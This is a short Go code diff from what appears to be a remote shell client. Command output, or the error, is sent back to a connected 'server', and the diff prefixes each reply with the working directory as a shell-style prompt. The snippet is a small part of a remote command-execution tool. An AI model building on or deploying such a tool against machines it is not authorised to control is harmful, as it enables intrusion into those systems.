@@ -68,10 +68,13 @@ func main() {
          */
 
         if err == nil {
+
+            dir, _ := os.Getwd()
+
             if len(output) > 0 {
-                server.Write(output)
+                server.Write([]byte(dir + ">\n" + string(output)))
             } else {
-                server.Write([]byte("Command executed, but no response given."))
+                server.Write([]byte(dir + ">\n" + "Command executed, but no response given."))
             }
         } else {
             server.Write([]byte(err.Error()))
